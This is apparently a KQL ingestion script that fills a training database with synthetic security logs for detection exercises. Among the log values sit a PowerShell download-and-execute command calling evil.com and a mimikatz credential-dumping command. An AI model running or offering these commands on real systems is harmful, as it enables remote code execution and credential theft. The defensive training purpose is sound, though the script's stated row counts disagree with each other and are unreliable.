// ============================================================================
// MustLearnKQL Training Database - Complete Data Ingestion
// ============================================================================
//
// EXECUTE EACH SECTION ONE AT A TIME
// - Select from .ingest to the last data row
// - Execute with Ctrl+Enter or Cmd+Enter
// - Wait for success message
// - Move to next section
//
// Total: ~250 rows across all essential tables
// Time: ~10 minutes (execute each section individually)
//
// ============================================================================

// ----------------------------------------------------------------------------
// SecurityEvent - Brute Force Attack Scenario
// ----------------------------------------------------------------------------
.ingest inline into table SecurityEvent <|
TimeGenerated,Computer,Account,AccountType,EventID,Activity,LogonType,IpAddress,TargetLogonId,Type
2024-01-15T08:00:00Z,WKS-WIN10-10,admin,User,4625,4625 - An account failed to log on,2,192.168.1.100,0x12345,SecurityEvent
2024-01-15T08:05:00Z,WKS-WIN10-10,admin,User,4625,4625 - An account failed to log on,2,192.168.1.100,0x12346,SecurityEvent
2024-01-15T08:10:00Z,WKS-WIN10-10,admin,User,4625,4625 - An account failed to log on,2,192.168.1.100,0x12347,SecurityEvent
2024-01-15T08:15:00Z,WKS-WIN10-10,admin,User,4625,4625 - An account failed to log on,2,192.168.1.100,0x12348,SecurityEvent
2024-01-15T08:20:00Z,WKS-WIN10-10,admin,User,4625,4625 - An account failed to log on,2,192.168.1.100,0x12349,SecurityEvent
2024-01-15T08:25:00Z,WKS-WIN10-10,admin,User,4625,4625 - An account failed to log on,2,192.168.1.100,0x1234A,SecurityEvent
2024-01-15T08:30:00Z,WKS-WIN10-10,admin,User,4625,4625 - An account failed to log on,2,192.168.1.100,0x1234B,SecurityEvent
2024-01-15T08:35:00Z,WKS-WIN10-10,admin,User,4625,4625 - An account failed to log on,2,192.168.1.100,0x1234C,SecurityEvent
2024-01-15T08:40:00Z,WKS-WIN10-10,admin,User,4625,4625 - An account failed to log on,2,192.168.1.100,0x1234D,SecurityEvent
2024-01-15T08:45:00Z,WKS-WIN10-10,admin,User,4625,4625 - An account failed to log on,2,192.168.1.100,0x1234E,SecurityEvent
2024-01-15T08:50:00Z,WKS-WIN10-10,admin,User,4624,4624 - An account was successfully logged on,2,192.168.1.100,0x1234F,SecurityEvent

// ----------------------------------------------------------------------------
// SecurityEvent - Normal Logon Activity
// ----------------------------------------------------------------------------
.ingest inline into table SecurityEvent <|
TimeGenerated,Computer,Account,AccountType,EventID,Activity,LogonType,IpAddress,TargetLogonId,Type
2024-01-15T09:00:00Z,WKS-WIN10-01,user1,User,4624,4624 - An account was successfully logged on,2,192.168.1.50,0x20001,SecurityEvent
2024-01-15T09:00:00Z,WKS-WIN10-02,user2,User,4624,4624 - An account was successfully logged on,2,192.168.1.51,0x20002,SecurityEvent
2024-01-15T09:00:00Z,SERVER01,SYSTEM,Machine,4624,4624 - An account was successfully logged on,3,192.168.1.10,0x20003,SecurityEvent
2024-01-15T17:00:00Z,WKS-WIN10-01,user1,User,4634,4634 - An account was logged off,2,192.168.1.50,0x20001,SecurityEvent
2024-01-16T09:00:00Z,WKS-WIN10-03,user3,User,4624,4624 - An account was successfully logged on,2,192.168.1.53,0x20004,SecurityEvent
2024-01-16T09:00:00Z,WKS-WIN10-04,user4,User,4624,4624 - An account was successfully logged on,2,192.168.1.54,0x20005,SecurityEvent
2024-01-16T09:00:00Z,DC01,SYSTEM,Machine,4624,4624 - An account was successfully logged on,3,192.168.1.5,0x20006,SecurityEvent
2024-01-17T09:00:00Z,WKS-WIN10-01,user1,User,4624,4624 - An account was successfully logged on,2,192.168.1.50,0x20007,SecurityEvent
2024-01-17T09:00:00Z,WKS-WIN10-02,user2,User,4624,4624 - An account was successfully logged on,2,192.168.1.51,0x20008,SecurityEvent
2024-01-18T09:00:00Z,WKS-WIN10-01,user1,User,4624,4624 - An account was successfully logged on,2,192.168.1.50,0x20009,SecurityEvent
2024-01-18T09:00:00Z,WKS-WIN10-02,user2,User,4624,4624 - An account was successfully logged on,2,192.168.1.51,0x20010,SecurityEvent
2024-01-08T09:00:00Z,LINUX-SRV-01,root,User,4624,4624 - An account was successfully logged on,3,192.168.1.20,0x50001,SecurityEvent
2024-01-08T09:00:00Z,LINUX-SRV-02,root,User,4624,4624 - An account was successfully logged on,3,192.168.1.21,0x50002,SecurityEvent

// ----------------------------------------------------------------------------
// SecurityEvent - Privilege Escalation
// ----------------------------------------------------------------------------
.ingest inline into table SecurityEvent <|
TimeGenerated,Computer,Account,AccountType,EventID,Activity,PrivilegeList,Type
2024-01-15T10:00:00Z,WKS-WIN10-05,user5,User,4672,4672 - Special privileges assigned to new logon,SeDebugPrivilege;SeBackupPrivilege,SecurityEvent
2024-01-15T10:15:00Z,WKS-WIN10-06,user5,User,4672,4672 - Special privileges assigned to new logon,SeDebugPrivilege;SeBackupPrivilege,SecurityEvent
2024-01-15T10:30:00Z,SERVER02,user5,User,4672,4672 - Special privileges assigned to new logon,SeDebugPrivilege;SeBackupPrivilege,SecurityEvent
2024-01-15T10:45:00Z,SERVER03,user5,User,4672,4672 - Special privileges assigned to new logon,SeDebugPrivilege;SeBackupPrivilege,SecurityEvent

// ----------------------------------------------------------------------------
// SecurityEvent - Suspicious PowerShell
// ----------------------------------------------------------------------------
.ingest inline into table SecurityEvent <|
TimeGenerated,Computer,Account,EventID,Activity,NewProcessName,ParentProcessName,CommandLine,Type
2024-01-15T11:00:00Z,WKS-WIN10-08,user8,4688,4688 - A new process has been created,powershell.exe,WINWORD.EXE,powershell.exe -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload'),SecurityEvent

// ----------------------------------------------------------------------------
// Heartbeat - System Health Data
// ----------------------------------------------------------------------------
.ingest inline into table Heartbeat <|
TimeGenerated,Computer,ComputerIP,OSType,OSMajorVersion,OSName,Version,Type
2024-01-15T08:00:00Z,WKS-WIN10-01,192.168.1.50,Windows,10,Windows 10 Enterprise,10.0.19044,Heartbeat
2024-01-15T08:00:00Z,WKS-WIN10-02,192.168.1.51,Windows,10,Windows 10 Enterprise,10.0.19044,Heartbeat
2024-01-15T08:00:00Z,WKS-WIN10-03,192.168.1.53,Windows,10,Windows 10 Enterprise,10.0.19044,Heartbeat
2024-01-15T08:00:00Z,WKS-WIN10-04,192.168.1.54,Windows,10,Windows 10 Enterprise,10.0.19044,Heartbeat
2024-01-15T08:00:00Z,WKS-WIN10-05,192.168.1.55,Windows,10,Windows 10 Enterprise,10.0.19044,Heartbeat
2024-01-15T08:00:00Z,WKS-WIN10-06,192.168.1.56,Windows,10,Windows 10 Enterprise,10.0.19044,Heartbeat
2024-01-15T08:00:00Z,WKS-WIN10-08,192.168.1.58,Windows,10,Windows 10 Enterprise,10.0.19044,Heartbeat
2024-01-15T08:00:00Z,WKS-WIN10-10,192.168.1.100,Windows,10,Windows 10 Enterprise,10.0.19044,Heartbeat
2024-01-15T08:00:00Z,SERVER01,192.168.1.10,Windows,Server 2019,Windows Server 2019 Datacenter,10.0.17763,Heartbeat
2024-01-15T08:00:00Z,SERVER02,192.168.1.11,Windows,Server 2019,Windows Server 2019 Datacenter,10.0.17763,Heartbeat
2024-01-15T08:00:00Z,SERVER03,192.168.1.12,Windows,Server 2019,Windows Server 2019 Datacenter,10.0.17763,Heartbeat
2024-01-15T08:00:00Z,DC01,192.168.1.5,Windows,Server 2019,Windows Server 2019 Datacenter,10.0.17763,Heartbeat
2024-01-15T08:00:00Z,DC02,192.168.1.6,Windows,Server 2019,Windows Server 2019 Datacenter,10.0.17763,Heartbeat
2024-01-15T08:00:00Z,LINUX-SRV-01,192.168.1.20,Linux,18.04,Ubuntu 18.04,8.0.30,Heartbeat
2024-01-15T08:00:00Z,LINUX-SRV-02,192.168.1.21,Linux,20.04,Ubuntu 20.04,8.0.30,Heartbeat

// ----------------------------------------------------------------------------
// Perf - Disk Space Trending
// ----------------------------------------------------------------------------
.ingest inline into table Perf <|
TimeGenerated,Computer,ObjectName,CounterName,InstanceName,CounterValue,Type
2024-01-10T00:00:00Z,SERVER01,LogicalDisk,Free Megabytes,C:,15000,Perf
2024-01-11T00:00:00Z,SERVER01,LogicalDisk,Free Megabytes,C:,14500,Perf
2024-01-12T00:00:00Z,SERVER01,LogicalDisk,Free Megabytes,C:,14000,Perf
2024-01-13T00:00:00Z,SERVER01,LogicalDisk,Free Megabytes,C:,13500,Perf
2024-01-14T00:00:00Z,SERVER01,LogicalDisk,Free Megabytes,C:,13000,Perf
2024-01-15T00:00:00Z,SERVER01,LogicalDisk,Free Megabytes,C:,12500,Perf
2024-01-16T00:00:00Z,SERVER01,LogicalDisk,Free Megabytes,C:,12000,Perf
2024-01-17T00:00:00Z,SERVER01,LogicalDisk,Free Megabytes,C:,11500,Perf
2024-01-18T00:00:00Z,SERVER01,LogicalDisk,Free Megabytes,C:,11000,Perf
2024-01-19T00:00:00Z,SERVER01,LogicalDisk,Free Megabytes,C:,10500,Perf
2024-01-20T00:00:00Z,SERVER01,LogicalDisk,Free Megabytes,C:,10000,Perf

// ----------------------------------------------------------------------------
// Perf - Additional Disk and CPU Data
// ----------------------------------------------------------------------------
.ingest inline into table Perf <|
TimeGenerated,Computer,ObjectName,CounterName,InstanceName,CounterValue,Type
2024-01-15T00:00:00Z,SERVER01,LogicalDisk,Free Megabytes,D:,50000,Perf
2024-01-15T00:00:00Z,SERVER02,LogicalDisk,Free Megabytes,C:,8000,Perf
2024-01-15T00:00:00Z,WKS-WIN10-01,Processor,% Processor Time,_Total,25.5,Perf
2024-01-15T00:00:00Z,WKS-WIN10-02,Processor,% Processor Time,_Total,32.1,Perf
2024-01-15T00:00:00Z,WKS-WIN10-01,Memory,Available MBytes,,4096,Perf
2024-01-15T01:00:00Z,WKS-WIN10-01,Processor,% Processor Time,_Total,28.3,Perf
2024-01-15T02:00:00Z,WKS-WIN10-01,Processor,% Processor Time,_Total,22.7,Perf
2024-01-15T08:00:00Z,WKS-WIN10-01,Processor,% Processor Time,_Total,45.2,Perf
2024-01-15T09:00:00Z,WKS-WIN10-01,Processor,% Processor Time,_Total,52.8,Perf
2024-01-15T10:00:00Z,WKS-WIN10-01,Processor,% Processor Time,_Total,38.4,Perf

// ----------------------------------------------------------------------------
// OfficeActivity - Normal Email Activity
// ----------------------------------------------------------------------------
.ingest inline into table OfficeActivity <|
TimeGenerated,UserId,Operation,RecordType,ClientIP,Subject,RecipientCount,Type
2024-01-15T10:00:00Z,user1@company.com,Send,ExchangeItem,192.168.1.50,Q4 Financial Report,3,OfficeActivity
2024-01-15T10:05:00Z,user2@company.com,Send,ExchangeItem,192.168.1.51,Meeting Tomorrow,1,OfficeActivity
2024-01-15T10:10:00Z,rodtrent@company.com,Send,ExchangeItem,192.168.1.60,KQL Training Resources,5,OfficeActivity
2024-01-15T11:00:00Z,user3@company.com,Send,ExchangeItem,192.168.1.53,Project Update,2,OfficeActivity
2024-01-15T11:30:00Z,user4@company.com,Send,ExchangeItem,192.168.1.54,Team Sync Notes,4,OfficeActivity
2024-01-15T12:00:00Z,user1@company.com,Send,ExchangeItem,192.168.1.50,Lunch Plans,1,OfficeActivity
2024-01-15T13:00:00Z,user2@company.com,FileAccessed,SharePointFileOperation,192.168.1.51,,0,OfficeActivity
2024-01-15T13:05:00Z,user2@company.com,FileModified,SharePointFileOperation,192.168.1.51,,0,OfficeActivity

// ----------------------------------------------------------------------------
// OfficeActivity - Phishing Campaign
// ----------------------------------------------------------------------------
.ingest inline into table OfficeActivity <|
TimeGenerated,UserId,Operation,RecordType,ClientIP,Subject,RecipientCount,Type
2024-01-15T14:00:00Z,user25@company.com,Send,ExchangeItem,185.220.101.25,Urgent: Account Verification Required,50,OfficeActivity
2024-01-15T14:05:00Z,user25@company.com,Send,ExchangeItem,185.220.101.25,Action Required: Reset Password,48,OfficeActivity
2024-01-15T14:10:00Z,user25@company.com,Send,ExchangeItem,185.220.101.25,Security Alert - Verify Your Account,52,OfficeActivity
2024-01-15T14:15:00Z,user25@company.com,Send,ExchangeItem,185.220.101.25,Urgent: Update Payment Info,45,OfficeActivity
2024-01-15T14:20:00Z,user25@company.com,Send,ExchangeItem,185.220.101.25,Important: Verify Identity,51,OfficeActivity

// ----------------------------------------------------------------------------
// DeviceFileEvents - Malware Execution Chain
// ----------------------------------------------------------------------------
.ingest inline into table DeviceFileEvents <|
TimeGenerated,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA256,InitiatingProcessFileName,Type
2024-01-15T11:00:00Z,device-guid-001,WKS-WIN10-08,FileCreated,malicious.exe,C:\\Users\\user8\\Downloads,a1b2c3d4e5f6789012345678901234567890123456789012345678901234abcd,chrome.exe,DeviceFileEvents
2024-01-15T11:05:00Z,device-guid-001,WKS-WIN10-08,FileCreated,payload.dll,C:\\Windows\\Temp,b2c3d4e5f6789012345678901234567890123456789012345678901234abcde,malicious.exe,DeviceFileEvents
2024-01-15T11:10:00Z,device-guid-001,WKS-WIN10-08,FileCreated,dropper.ps1,C:\\Users\\user8\\AppData\\Roaming,c3d4e5f6789012345678901234567890123456789012345678901234abcdef,malicious.exe,DeviceFileEvents

// ----------------------------------------------------------------------------
// DeviceFileEvents - Legitimate Activity
// ----------------------------------------------------------------------------
.ingest inline into table DeviceFileEvents <|
TimeGenerated,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA256,InitiatingProcessFileName,Type
2024-01-15T09:00:00Z,device-guid-002,WKS-WIN10-01,FileCreated,document.docx,C:\\Users\\user1\\Documents,d4e5f6789012345678901234567890123456789012345678901234abcdef01,WINWORD.EXE,DeviceFileEvents
2024-01-15T09:30:00Z,device-guid-002,WKS-WIN10-01,FileModified,document.docx,C:\\Users\\user1\\Documents,d4e5f6789012345678901234567890123456789012345678901234abcdef01,WINWORD.EXE,DeviceFileEvents

// ----------------------------------------------------------------------------
// DeviceProcessEvents - Suspicious PowerShell
// ----------------------------------------------------------------------------
.ingest inline into table DeviceProcessEvents <|
TimeGenerated,DeviceId,DeviceName,ActionType,FileName,ProcessCommandLine,InitiatingProcessFileName,AccountName,Type
2024-01-15T11:00:00Z,device-guid-001,WKS-WIN10-08,ProcessCreated,powershell.exe,powershell.exe -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')",WINWORD.EXE,user8,DeviceProcessEvents
2024-01-15T11:05:00Z,device-guid-001,WKS-WIN10-08,ProcessCreated,malicious.exe,C:\\Users\\user8\\Downloads\\malicious.exe /silent,explorer.exe,user8,DeviceProcessEvents

// ----------------------------------------------------------------------------
// DeviceProcessEvents - Credential Dumping
// ----------------------------------------------------------------------------
.ingest inline into table DeviceProcessEvents <|
TimeGenerated,DeviceId,DeviceName,ActionType,FileName,ProcessCommandLine,InitiatingProcessFileName,AccountName,Type
2024-01-15T15:00:00Z,device-guid-003,WKS-WIN10-12,ProcessCreated,powershell.exe,powershell.exe -c "sekurlsa::logonpasswords",cmd.exe,user12,DeviceProcessEvents

// ----------------------------------------------------------------------------
// DeviceNetworkEvents - C2 Communication Pattern
// ----------------------------------------------------------------------------
.ingest inline into table DeviceNetworkEvents <|
TimeGenerated,DeviceId,DeviceName,ActionType,RemoteIP,RemotePort,RemoteUrl,InitiatingProcessFileName,Type
2024-01-15T10:00:00Z,device-guid-001,WKS-WIN10-08,ConnectionSuccess,203.0.113.25,8080,,malicious.exe,DeviceNetworkEvents
2024-01-15T10:05:00Z,device-guid-001,WKS-WIN10-08,ConnectionSuccess,203.0.113.25,8080,,malicious.exe,DeviceNetworkEvents
2024-01-15T10:10:00Z,device-guid-001,WKS-WIN10-08,ConnectionSuccess,203.0.113.25,8080,,malicious.exe,DeviceNetworkEvents
2024-01-15T10:15:00Z,device-guid-001,WKS-WIN10-08,ConnectionSuccess,203.0.113.25,8080,,malicious.exe,DeviceNetworkEvents
2024-01-15T10:20:00Z,device-guid-001,WKS-WIN10-08,ConnectionSuccess,203.0.113.25,8080,,malicious.exe,DeviceNetworkEvents

// ----------------------------------------------------------------------------
// DeviceNetworkEvents - Legitimate Connections
// ----------------------------------------------------------------------------
.ingest inline into table DeviceNetworkEvents <|
TimeGenerated,DeviceId,DeviceName,ActionType,RemoteIP,RemotePort,RemoteUrl,InitiatingProcessFileName,Type
2024-01-15T09:00:00Z,device-guid-002,WKS-WIN10-01,ConnectionSuccess,40.112.72.205,443,www.microsoft.com,msedge.exe,DeviceNetworkEvents
2024-01-15T09:05:00Z,device-guid-002,WKS-WIN10-01,ConnectionSuccess,52.96.165.167,443,outlook.office365.com,OUTLOOK.EXE,DeviceNetworkEvents

// ----------------------------------------------------------------------------
// DeviceRegistryEvents - Persistence via Run Key
// ----------------------------------------------------------------------------
.ingest inline into table DeviceRegistryEvents <|
TimeGenerated,DeviceId,DeviceName,ActionType,RegistryKey,RegistryValueName,RegistryValueData,InitiatingProcessFileName,Type
2024-01-15T11:15:00Z,device-guid-001,WKS-WIN10-08,RegistryValueSet,HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,SecurityUpdater,C:\\Users\\user8\\AppData\\Roaming\\updater.exe,malicious.exe,DeviceRegistryEvents
2024-01-15T11:20:00Z,device-guid-001,WKS-WIN10-08,RegistryValueSet,HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce,WindowsDefender,C:\\Windows\\Temp\\defender.exe,malicious.exe,DeviceRegistryEvents

// ----------------------------------------------------------------------------
// DeviceRegistryEvents - Legitimate Installation
// ----------------------------------------------------------------------------
.ingest inline into table DeviceRegistryEvents <|
TimeGenerated,DeviceId,DeviceName,ActionType,RegistryKey,RegistryValueName,RegistryValueData,InitiatingProcessFileName,Type
2024-01-15T10:00:00Z,device-guid-002,WKS-WIN10-01,RegistryValueSet,HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{GUID},DisplayName,Microsoft Office Professional Plus 2021,setup.exe,DeviceRegistryEvents

// ----------------------------------------------------------------------------
// AzureActivity - Cloud Shell Usage (Part 8)
// ----------------------------------------------------------------------------
.ingest inline into table AzureActivity <|
TimeGenerated,ResourceGroup,ResourceProviderValue,ActivityStatusValue,Caller,CallerIpAddress,OperationNameValue,Type
2024-01-15T10:00:00Z,CLOUD-SHELL-storage-eastus,MICROSOFT.STORAGE,Start,admin@company.com,203.0.113.45,Microsoft.Storage/storageAccounts/write,AzureActivity
2024-01-15T10:05:00Z,CLOUD-SHELL-storage-westus,MICROSOFT.STORAGE,Start,user1@company.com,192.168.1.50,Microsoft.Storage/storageAccounts/write,AzureActivity
2024-01-15T10:10:00Z,production-rg,MICROSOFT.COMPUTE,Success,admin@company.com,203.0.113.45,Microsoft.Compute/virtualMachines/start/action,AzureActivity

// ----------------------------------------------------------------------------
// SigninLogs - Impossible Travel Scenario
// ----------------------------------------------------------------------------
.ingest inline into table SigninLogs <|
TimeGenerated,UserPrincipalName,ResultType,IPAddress,Location,AppDisplayName,Type
2024-01-15T08:00:00Z,user30@company.com,0,192.168.1.130,US,Office 365,SigninLogs
2024-01-15T09:00:00Z,user30@company.com,0,203.0.113.88,CN,Office 365,SigninLogs
2024-01-15T14:00:00Z,user30@company.com,0,192.168.1.130,US,Office 365,SigninLogs

// ----------------------------------------------------------------------------
// SigninLogs - Failed Sign-ins (Brute Force)
// ----------------------------------------------------------------------------
.ingest inline into table SigninLogs <|
TimeGenerated,UserPrincipalName,ResultType,IPAddress,Location,AppDisplayName,Type
2024-01-15T12:00:00Z,admin@company.com,50126,203.0.113.100,RU,Azure Portal,SigninLogs
2024-01-15T12:05:00Z,admin@company.com,50126,203.0.113.100,RU,Azure Portal,SigninLogs
2024-01-15T12:10:00Z,admin@company.com,50126,203.0.113.100,RU,Azure Portal,SigninLogs
2024-01-15T12:15:00Z,admin@company.com,50126,203.0.113.100,RU,Azure Portal,SigninLogs
2024-01-15T12:20:00Z,admin@company.com,0,203.0.113.100,RU,Azure Portal,SigninLogs

// ----------------------------------------------------------------------------
// EmailEvents - Phishing Campaign
// ----------------------------------------------------------------------------
.ingest inline into table EmailEvents <|
TimeGenerated,NetworkMessageId,SenderFromAddress,RecipientEmailAddress,Subject,ThreatTypes,DeliveryAction,EmailDirection,Type
2024-01-15T13:00:00Z,msg-001,security@company-verify.tk,user1@company.com,Urgent: Account Verification Required,"[""Phish""]",Delivered,Inbound,EmailEvents
2024-01-15T13:05:00Z,msg-002,security@company-verify.tk,user2@company.com,Urgent: Account Verification Required,"[""Phish""]",Blocked,Inbound,EmailEvents
2024-01-15T13:10:00Z,msg-003,security@company-verify.tk,user3@company.com,Urgent: Account Verification Required,"[""Phish""]",Quarantined,Inbound,EmailEvents
2024-01-15T13:15:00Z,msg-004,security@company-verify.tk,user4@company.com,Urgent: Account Verification Required,"[""Phish""]",Delivered,Inbound,EmailEvents
2024-01-15T13:20:00Z,msg-005,security@company-verify.tk,user5@company.com,Urgent: Account Verification Required,"[""Phish""]",Delivered,Inbound,EmailEvents

// ----------------------------------------------------------------------------
// EmailEvents - Legitimate Emails
// ----------------------------------------------------------------------------
.ingest inline into table EmailEvents <|
TimeGenerated,NetworkMessageId,SenderFromAddress,RecipientEmailAddress,Subject,ThreatTypes,DeliveryAction,EmailDirection,Type
2024-01-15T09:00:00Z,msg-100,user1@company.com,user2@company.com,Meeting Notes,"[]",Delivered,Intraorg,EmailEvents
2024-01-15T09:30:00Z,msg-101,partner@vendor.com,user1@company.com,Project Update,"[]",Delivered,Inbound,EmailEvents

// ----------------------------------------------------------------------------
// EmailUrlInfo - Phishing URLs
// ----------------------------------------------------------------------------
.ingest inline into table EmailUrlInfo <|
TimeGenerated,UrlId,NetworkMessageId,Url,UrlDomain,ThreatTypes,Type
2024-01-15T13:00:00Z,url-001,msg-001,http://company-verify.tk/login.php,company-verify.tk,"[""Phish""]",EmailUrlInfo
2024-01-15T13:05:00Z,url-002,msg-002,http://company-verify.tk/login.php,company-verify.tk,"[""Phish""]",EmailUrlInfo
2024-01-15T13:10:00Z,url-003,msg-003,http://company-verify.tk/login.php,company-verify.tk,"[""Phish""]",EmailUrlInfo

// ----------------------------------------------------------------------------
// EmailUrlInfo - Legitimate URLs
// ----------------------------------------------------------------------------
.ingest inline into table EmailUrlInfo <|
TimeGenerated,UrlId,NetworkMessageId,Url,UrlDomain,ThreatTypes,Type
2024-01-15T09:00:00Z,url-100,msg-100,https://microsoft.com,microsoft.com,"[]",EmailUrlInfo
2024-01-15T09:30:00Z,url-101,msg-101,https://sharepoint.com/documents,sharepoint.com,"[]",EmailUrlInfo

// ----------------------------------------------------------------------------
// EmailAttachmentInfo - Malware Attachments
// ----------------------------------------------------------------------------
.ingest inline into table EmailAttachmentInfo <|
TimeGenerated,NetworkMessageId,SenderFromAddress,RecipientEmailAddress,FileName,FileExtension,FileType,SHA256,MalwareFilterVerdict,ThreatTypes,Type
2024-01-15T14:00:00Z,msg-200,invoice@accounting.tk,user10@company.com,invoice_2024_01.pdf.exe,.exe,Executable,abc123def456789012345678901234567890123456789012345678901234abcd,Malware,"[""Malware""]",EmailAttachmentInfo
2024-01-15T14:05:00Z,msg-201,payments@finance.ml,user11@company.com,payment_receipt.docx.scr,.scr,Executable,def456789012345678901234567890123456789012345678901234abcdef123,Malware,"[""Malware""]",EmailAttachmentInfo

// ----------------------------------------------------------------------------
// EmailAttachmentInfo - Legitimate Attachments
// ----------------------------------------------------------------------------
.ingest inline into table EmailAttachmentInfo <|
TimeGenerated,NetworkMessageId,SenderFromAddress,RecipientEmailAddress,FileName,FileExtension,FileType,SHA256,MalwareFilterVerdict,ThreatTypes,Type
2024-01-15T09:00:00Z,msg-100,user1@company.com,user2@company.com,meeting_notes.pdf,.pdf,Document,789012345678901234567890123456789012345678901234abcdef123456789,Clean,"[]",EmailAttachmentInfo

// ----------------------------------------------------------------------------
// UpdateSummary - Patching Compliance
// ----------------------------------------------------------------------------
.ingest inline into table UpdateSummary <|
TimeGenerated,Computer,OldestMissingSecurityUpdateInDays,WindowsUpdateSetting,CriticalUpdatesMissing,SecurityUpdatesMissing,RestartPending,OSType,Type
2024-01-15T00:00:00Z,WKS-WIN10-01,2,Managed,0,1,false,Windows,UpdateSummary
2024-01-15T00:00:00Z,WKS-WIN10-10,35,Manual,3,8,true,Windows,UpdateSummary
2024-01-15T00:00:00Z,SERVER01,5,Managed,0,2,false,Windows,UpdateSummary
2024-01-15T00:00:00Z,SERVER02,15,Automatic,1,5,true,Windows,UpdateSummary

// ----------------------------------------------------------------------------
// Update - Specific KB Information
// ----------------------------------------------------------------------------
.ingest inline into table Update <|
TimeGenerated,Computer,Title,KBID,Classification,UpdateState,PublishedDate,MSRCSeverity,CVENumbers,Type
2024-01-15T00:00:00Z,WKS-WIN10-10,Security Update for Windows 10 Version 21H2 (KB5001234),KB5001234,Security Updates,Needed,2024-01-10T00:00:00Z,Critical,"[""CVE-2024-12345"",""CVE-2024-12346""]",Update
2024-01-15T00:00:00Z,WKS-WIN10-10,Cumulative Update for Windows 10 (KB5002345),KB5002345,Critical Updates,Needed,2024-01-08T00:00:00Z,Important,"[""CVE-2024-12347""]",Update
2024-01-15T00:00:00Z,SERVER01,Security Update for Windows Server 2019 (KB5003456),KB5003456,Security Updates,Installed,2024-01-12T00:00:00Z,Critical,"[""CVE-2024-12348""]",Update

// ----------------------------------------------------------------------------
// SecurityAlert - Sample Alerts
// ----------------------------------------------------------------------------
.ingest inline into table SecurityAlert <|
TimeGenerated,AlertName,AlertSeverity,Description,ProviderName,CompromisedEntity,Tactics,Techniques,Status,Type
2024-01-15T08:50:00Z,Brute force attack detected,High,Multiple failed logon attempts detected for account 'admin' on 'WKS-WIN10-10',Azure Sentinel,WKS-WIN10-10,"[""CredentialAccess""]","[""T1110""]",New,SecurityAlert
2024-01-15T11:15:00Z,Malware detected on endpoint,High,Suspicious executable detected in Downloads folder,Microsoft Defender for Endpoint,WKS-WIN10-08,"[""Execution""]","[""T1204""]",InProgress,SecurityAlert
2024-01-15T10:30:00Z,Privilege escalation attempt,Medium,User account granted sensitive privileges across multiple systems,Azure Sentinel,user5,"[""PrivilegeEscalation""]","[""T1078""]",New,SecurityAlert
2024-01-15T14:00:00Z,Phishing campaign detected,High,Multiple users received phishing emails from suspicious domain,Microsoft Defender for Office 365,company.com,"[""InitialAccess""]","[""T1566.002""]",New,SecurityAlert

// ----------------------------------------------------------------------------
// Usage - Data Volume Visualization
// ----------------------------------------------------------------------------
.ingest inline into table Usage <|
TimeGenerated,DataType,Solution,Quantity,IsBillable,Type
2024-01-10T00:00:00Z,SecurityEvent,Security,3500.5,true,Usage
2024-01-10T00:00:00Z,Perf,LogManagement,1200.3,true,Usage
2024-01-10T00:00:00Z,Heartbeat,LogManagement,150.2,false,Usage
2024-01-10T00:00:00Z,OfficeActivity,Security,800.7,true,Usage
2024-01-11T00:00:00Z,SecurityEvent,Security,3650.2,true,Usage
2024-01-11T00:00:00Z,Perf,LogManagement,1150.8,true,Usage
2024-01-12T00:00:00Z,SecurityEvent,Security,3720.9,true,Usage
2024-01-12T00:00:00Z,Perf,LogManagement,1180.5,true,Usage
2024-01-13T00:00:00Z,SecurityEvent,Security,3800.4,true,Usage
2024-01-14T00:00:00Z,SecurityEvent,Security,3900.1,true,Usage

// ============================================================================
// VERIFICATION
// ============================================================================
// After executing all sections, verify with:
//
// SecurityEvent | count          // Should be ~30
// Heartbeat | count              // Should be 15
// Perf | count                   // Should be 21
// OfficeActivity | count         // Should be 13
// DeviceFileEvents | count       // Should be 5
// DeviceProcessEvents | count    // Should be 3
// DeviceNetworkEvents | count    // Should be 7
// DeviceRegistryEvents | count   // Should be 3
// AzureActivity | count          // Should be 3
// SigninLogs | count             // Should be 8
// EmailEvents | count            // Should be 7
// EmailUrlInfo | count           // Should be 5
// EmailAttachmentInfo | count    // Should be 3
// UpdateSummary | count          // Should be 4
// Update | count                 // Should be 3
// SecurityAlert | count          // Should be 4
// Usage | count                  // Should be 10
//
// Total: ~142 rows
// ============================================================================
